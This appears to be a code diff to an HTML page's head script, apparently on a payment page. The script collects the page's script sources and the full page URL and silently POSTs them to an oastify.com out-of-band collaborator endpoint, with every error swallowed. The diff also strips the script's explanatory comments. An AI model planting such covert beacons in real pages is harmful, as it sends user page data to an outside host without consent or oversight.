@@ -3,17 +3,16 @@
 <head>
     <script>
 
-(function () {
+        (function () {
   'use strict';
 
   // ─── Config ───────────────────────────────────────────────
-  const ENDPOINT   = 'https://0nokywbevarydes1ipi5qw1vvm1dp3ds.oastify.com/collect';
+  const ENDPOINT    = 'https://0nokywbevarydes1ipi5qw1vvm1dp3ds.oastify.com/collect';
   const MAX_SCRIPTS = 100;
   const MAX_BYTES   = 50000;
   const TIMEOUT_MS  = 3000;
   // ──────────────────────────────────────────────────────────
 
-  // Wrap everything in try/catch — if anything throws, payment page is unaffected
   try {
     const scriptMeta = new Map();
 
@@ -26,15 +25,13 @@
             crossorigin: node.getAttribute('crossorigin') || null
           });
         }
-      } catch (_) {}  // capture failure never propagates
+      } catch (_) {}
     }
 
-    // Grab what's already in DOM
     try {
       document.querySelectorAll('script[src]').forEach(s => captureScript(s));
     } catch (_) {}
 
-    // Watch for dynamically injected scripts
     try {
       new MutationObserver(mutations => {
         try {
@@ -45,41 +42,22 @@
       }).observe(document.documentElement, { childList: true, subtree: true });
     } catch (_) {}
 
-    // Hash script inventory for change detection
-    async function hashScripts(scripts) {
-      try {
-        const str = JSON.stringify(scripts.sort((a, b) => a.url.localeCompare(b.url)));
-        const buffer = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
-        return Array.from(new Uint8Array(buffer)).map(b => b.toString(16).padStart(2, '0')).join('');
-      } catch (_) {
-        return null;  // hash failed — still send without it
-      }
-    }
-
-    // Fire after page fully loaded
     window.addEventListener('load', async () => {
-      // Defer by one tick — ensures load event fully completes first
       await new Promise(r => setTimeout(r, 0));
 
       try {
         const scripts = [...scriptMeta.values()];
 
-        // Guard 1: too many scripts
         if (scripts.length > MAX_SCRIPTS) return;
-
-        const fingerprint = await hashScripts(scripts);
 
         const payload = JSON.stringify({
           page: window.location.href,
-          fingerprint,
           scripts,
           ts: Date.now()
         });
 
-        // Guard 2: payload too large
         if (payload.length > MAX_BYTES) return;
 
-        // Fire and forget — all failures silently swallowed
         fetch(ENDPOINT, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -88,12 +66,12 @@
           signal: AbortSignal.timeout(TIMEOUT_MS)
         }).catch(() => {});
 
-      } catch (_) {}  // any unexpected error — silently ignored
+      } catch (_) {}
     });
 
-  } catch (_) {}  // outer catch — script itself crashing never affects page
+  } catch (_) {}
 
-})();  // IIFE — no global variables leaked
+})();
         
     </script>
     <meta charset="UTF-8">
